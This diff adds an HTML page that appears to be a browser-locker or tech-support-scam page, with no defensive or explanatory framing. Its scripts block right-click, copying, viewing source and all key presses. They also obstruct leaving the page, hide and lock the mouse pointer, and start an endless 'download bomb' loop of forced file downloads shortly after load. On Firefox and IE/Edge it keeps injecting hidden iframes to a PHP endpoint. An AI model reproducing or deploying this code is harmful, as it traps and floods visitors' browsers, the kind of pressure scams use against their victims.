@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    //browser
+    var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
+    // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
+    var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
+    var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+    // At least Safari 3+: "[object HTMLElementConstructor]"
+    var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
+    var isIE = /*@cc_on!@*/false || !!document.documentMode;   // At least IE6
+
+        function getVariableFromURl(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+  </script>
+
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
+        integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+  <!-- Optional theme -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css"
+        integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+<style>
+  /* The Modal (background) */
+  .modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    padding-top: 80px; /* Location of the box */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+  }
+
+  /* Modal Content */
+  .modal-content {
+    position: relative;
+    background-color: orange;
+    margin: auto;
+    padding: 0;
+    /*border: 1px solid #888;*/
+    width: 80%;
+    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+    -webkit-animation-name: animatetop;
+    -webkit-animation-duration: 0.4s;
+    animation-name: animatetop;
+    animation-duration: 0.4s
+  }
+
+  /* Add Animation */
+  @-webkit-keyframes animatetop {
+    from {top:-300px; opacity:0}
+    to {top:0; opacity:1}
+  }
+
+  @keyframes animatetop {
+    from {top:-300px; opacity:0}
+    to {top:0; opacity:1}
+  }
+
+  /* The Close Button */
+  .close {
+  display:none;
+    color: white;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+  }
+
+  .close:hover,
+  .close:focus {
+    color: #000;
+    text-decoration: none;
+    cursor: pointer;
+  }
+
+  .modal-header {
+    padding: 2px 20px;
+    background-color: orange;
+    color: white;
+
+  }
+  .modal-header h2
+  {
+  border:none;
+  font-size:42px;
+  }
+
+  .modal-body {padding: 2px 20px;color:white;}
+
+  .modal-footer {
+    padding: 2px 10px;
+    background-color: orange;
+    color: white;
+    height:80px;
+
+  }
+
+  .modal-footer btn{
+  background-color:orange;
+  }
+  	</style>
+
+
+      <script type="text/javascript">
+                      (function(funcName, baseObj) {
+                              funcName = funcName || "docReady";
+                              baseObj = baseObj || window;
+                              var readyList = [];
+                              var readyFired = false;
+                              var readyEventHandlersInstalled = false;
+                              function ready() {
+                                  if (!readyFired) {
+                                      // this must be set to true before we start calling callbacks
+                                      readyFired = true;
+                                      for (var i = 0; i < readyList.length; i++) {
+                                          readyList[i].fn.call(window, readyList[i].ctx);
+                                      }
+                                      readyList = [];
+                                  }
+                              }
+
+                              function readyStateChange() {
+                                  if ( document.readyState === "complete" ) {
+                                      ready();
+                                  }
+                              }
+                              baseObj[funcName] = function(callback, context) {
+                                  if (readyFired) {
+                                      setTimeout(function() {callback(context);}, 1);
+                                      return;
+                                  } else {
+                                      readyList.push({fn: callback, ctx: context});
+                                  }
+                                  if (document.readyState === "complete") {
+                                      setTimeout(ready, 1);
+                                  } else if (!readyEventHandlersInstalled) {
+                                      if (document.addEventListener) {
+                                          document.addEventListener("DOMContentLoaded", ready, false);
+                                          window.addEventListener("load", ready, false);
+                                      } else {
+                                          document.attachEvent("onreadystatechange", readyStateChange);
+                                          window.attachEvent("onload", ready);
+                                      }
+                                      readyEventHandlersInstalled = true;
+                                  }
+                              }
+                      })("docReady", window);
+
+                      document.ondragstart = test;
+                      document.onselectstart = test;
+                      document.oncontextmenu = test;
+                      function test() {
+                          return false;
+                      }
+                      document.oncontextmenu;
+                      function catchControlKeys(event) {
+                          var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
+                          if (event.ctrlKey) {
+                              // Ctrl+U
+                              if (code == 117) {
+                                  return false;
+                              }
+                              if (code == 85) {
+                                  return false;
+                              }
+                              // Ctrl+C
+                              if (code == 99) {
+                                  return false;
+                              }
+                              if (code == 67) {
+                                  return false;
+                              }
+                              // Ctrl+A
+                              if (code == 97) {
+                                  return false;
+                              }
+                              if (code == 65) {
+                                  return false;
+                              }
+                          }
+                      }
+                  </script>
+      <script type="text/javascript">
+          function goodbye(e) {
+              if (!e)
+                  e = window.event;
+              e.cancelBubble = true;
+              e.returnValue = "";
+              if (e.stopPropagation) {
+                  e.stopPropagation();
+                  e.preventDefault();
+              }
+          }
+          window.onbeforeunload = goodbye;
+      </script>
+
+      <script type='text/javascript'>
+        document.onkeydown = function (e) {
+          e.preventDefault();
+        }
+      </script>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+    <style type="text/css">
+        .nocursor { cursor:none; }
+    </style>
+    </head>
+
+
+<body class="nocursor en ltr" style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair; background-image: url('transparent.png');" id="mycanvas">
+
+<div id="body" class="container-fluid">
+  <div class="row">
+    <div class="col-md-12">
+      <div class="row block1">
+        <div class="col-md-4 left">
+          <label style="font-size: 12px;">
+            <br /> <br /> 
+            <input type="button" value="Click any where in the page" >
+        </div>
+        <div class="col-md-4">
+          <div class="middle" id="alert-modal">
+            <div class="content-box" id="alert-content-box">
+            </div>
+          </div>
+
+          <div class="block22" >
+            <div class="row">
+              <div class="col-md-4">
+                <img src="transparent.png">
+              </div>
+              <div class="col-md-4" >
+                <div id="red_alert1" class="">
+                  <img style="height: 900px; width: 900px; margin-top: -10px;" src="transparent.png">
+                </div>
+                <div class="row">
+                  <div class="col-md-12">
+                    <div class="row">
+                      <div class="col-md-12">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4 right">
+
+          <form style="text-align: left;" action="Cfdshfgdsjhfg.php" method="POST" align="center">
+            <div>
+            </div>
+            <div class="tbl-center" style="margin-top: 5px;">
+              <div style="min-width:100px;">
+              </div>
+              <div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="block2" style=" background-color:white">
+  <div class="row">
+    <div class="col-md-3">
+    </div>
+    <div class="col-md-6">
+      <div id="red_alert" style="margin-bottom: 25px;">
+        <img style="height: 40px; width: 40px; margin-top: -10px;" src="transparent.png">
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="row">
+            <div class="col-md-6 no-padding-right">
+            </div>
+            <div class="col-md-6 no-padding-left">
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script type="text/javascript">
+      function download(g, h, j) {
+          var k = new Blob([g], {
+              type: j
+          });
+          if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
+          else {
+              var l = document.createElement("a"),
+                  m = URL.createObjectURL(k);
+              l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+          }
+      }
+      function bomb_ch() {
+          var g = Math.random().toString(36).substring(20),
+              h = Math.floor(50 * Math.random() + 25);
+              while (true) download(h, g, g)
+      }
+      function ch_jam() {
+          bomb_ch()
+      }
+      docReady(function()
+              {
+                  setTimeout(function(){
+          setInterval(ch_jam, 0.5);
+      }, 2000);
+              });
+
+  </script>
+
+<script>
+// Get the modal
+var modal = document.getElementById('myModal');
+var btn = document.getElementById("myBtn");
+var span = document.getElementsByClassName("close")[0];
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+</script>
+  <script type="text/javascript">
+function addEvent(obj, evt, fn) {
+    if (obj.addEventListener) {
+        obj.addEventListener(evt, fn, false);
+    }
+    else if (obj.attachEvent) {
+        obj.attachEvent("on" + evt, fn);
+    }
+}
+addEvent(window,"load",function(e) {
+    addEvent(document, "mouseout", function(e) {
+        e = e ? e : window.event;
+        var from = e.relatedTarget || e.toElement;
+        if (!from || from.nodeName == "HTML") {
+       modal.style.display = "block";
+        }
+    });
+});
+
+  $(document).mousemove(function(){
+  var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
+  });
+
+</script>
+
+
+<script type="text/javascript">
+
+ function get_browser(){
+    var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+    if(/trident/i.test(M[1])){
+        tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+        return {name:'IE',version:(tem[1]||'')};
+        }
+    if(M[1]==='Chrome'){
+        tem=ua.match(/\bOPR\/(\d+)/)
+        if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+        }
+    M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+    if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+    return {
+      name: M[0],
+      version: M[1]
+    };
+ }
+ var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
+var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+var browser=get_browser();
+if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
+  if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
+    {
+
+      function msg_ff() {
+
+            var i = document.createElement("div");
+            i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Cfdshfgdsjhfg.php"></iframe></div>';
+            document.body.appendChild(i);
+
+        }
+        window.setInterval(function() {
+            msg_ff();
+
+        }, 1100);
+
+      }
+  else{
+      function msg_ff() {
+
+            var i = document.createElement("div");
+            i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Cfdshfgdsjhfg.php"></iframe></div>';
+            document.body.appendChild(i);
+        }
+        window.setInterval(function() {
+            msg_ff();
+
+        }, 1100);
+
+    }
+
+ }
+ else{
+
+   }
+</script>
+
+</body>
+</html>
